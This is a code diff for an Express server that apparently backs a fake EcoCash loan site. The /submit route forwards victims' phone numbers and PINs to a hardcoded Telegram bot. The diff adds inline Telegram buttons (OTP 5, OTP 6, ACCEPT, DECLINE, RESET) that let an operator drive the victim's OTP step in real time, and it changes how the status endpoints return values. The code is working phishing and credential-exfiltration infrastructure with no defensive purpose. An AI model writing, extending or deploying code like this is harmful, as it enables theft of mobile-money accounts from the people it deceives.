@@ -21,10 +21,11 @@ const CHAT_ID = "7162306402";
 // ==============================
 // TELEGRAM FUNCTION
 // ==============================
+
 async function sendToTelegram(message) {
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
-  const response = await fetch(url, {
+  await fetch(url, {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
@@ -32,15 +33,24 @@ async function sendToTelegram(message) {
     body: JSON.stringify({
       chat_id: CHAT_ID,
       text: message,
-    }),
+
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "OTP 5", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5" },
+            { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
+          ],
+          [
+            { text: "✅ ACCEPT", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept" },
+            { text: "❌ DECLINE", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline" }
+          ],
+          [
+            { text: "🔄 RESET", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=reset" }
+          ]
+        ]
+      }
+    })
   });
-
-  const data = await response.json();
-  console.log("TELEGRAM RESPONSE:", data);
-
-  if (!data.ok) {
-    throw new Error("Telegram failed");
-  }
 }
 
 app.post("/submit", async (req, res) => {
@@ -54,16 +64,9 @@ app.post("/submit", async (req, res) => {
 📞 Phone: ${phone}
 🔐 PIN: ${pin}
 
-⚙️ ADMIN CONTROL:
-
-OTP 5 → https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5
-OTP 6 → https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6
-
-✅ ACCEPT → https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept
-❌ DECLINE → https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline
-
-🔄 RESET → https://ecocash-loan-app.onrender.com/telegram-command?cmd=reset
+👇 Use buttons below
 `;
+
 console.log("SENDING MESSAGE:", message);
 
     await sendToTelegram(message);
@@ -132,21 +135,11 @@ app.post("/set-otp", (req, res) => {
 });
 
 app.get("/otp-status", (req, res) => {
-  const currentOtp = otpLength;
-
-  // RESET AFTER READ (IMPORTANT)
-  otpLength = null;
-
-  res.json({ otp: currentOtp });
+  res.json({ otp: otpLength });
 });
 
 app.get("/decision-status", (req, res) => {
-  const currentDecision = decision;
-
-  // RESET AFTER READ
-  decision = null;
-
-  res.json({ decision: currentDecision });
+  res.json({ decision });
 });
 
 // ==============================
